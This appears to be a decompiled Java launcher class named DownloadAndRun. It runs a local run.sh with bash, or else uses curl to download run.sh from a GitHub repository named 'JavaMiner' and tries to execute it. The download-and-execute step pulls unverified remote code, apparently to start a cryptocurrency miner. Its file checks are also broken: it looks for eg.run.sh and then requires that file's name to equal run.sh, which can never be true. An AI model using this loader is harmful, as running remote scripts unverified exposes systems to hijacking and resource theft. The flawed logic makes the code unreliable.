import java.io.File;
import java.io.IOException;

public class DownloadAndRun {
   public static void main(String[] var0) {
      try {
         File var1 = new File("run.sh");
         ProcessBuilder var2;
         Process var3;
         int var4;
         if (var1.exists()) {
            var2 = new ProcessBuilder(new String[]{"bash", "run.sh"});
            var2.inheritIO();
            var3 = var2.start();
            var4 = var3.waitFor();
            System.exit(var4);
         }
         var2 = new ProcessBuilder(new String[]{"curl", "-LO", "https://raw.githubusercontent.com/orkkz/JavaMiner/refs/heads/main/resources/run.sh"});
         var2.inheritIO();
         var3 = var2.start();
         var4 = var3.waitFor();
         if (var4 == 0) {
            File var5 = new File("eg.run.sh");
            if (var5.exists()) {
               if (var5.getName().equals("run.sh")) {
                  ProcessBuilder var6 = new ProcessBuilder(new String[]{"bash", "run.sh"});
                  var6.inheritIO();
                  Process var7 = var6.start();
                  int var8 = var7.waitFor();
                  System.exit(var8);
               } else {
                  System.err.println("\u001b[34m[ \u001b[31mERROR \u001b[34m] You need to rename eg.run.sh to run.sh");
                  System.exit(1);
               }
            } else {
               System.err.println("\u001b[34m[ \u001b[31mERROR \u001b[34m] Edit the file eg.run.sh or rename it to run.sh");
               System.exit(1);
            }
         } else {
            System.err.println("Error downloading the file.");
            System.exit(1);
         }
      } catch (InterruptedException | IOException var9) {
         System.exit(1);
      }

   }
}
    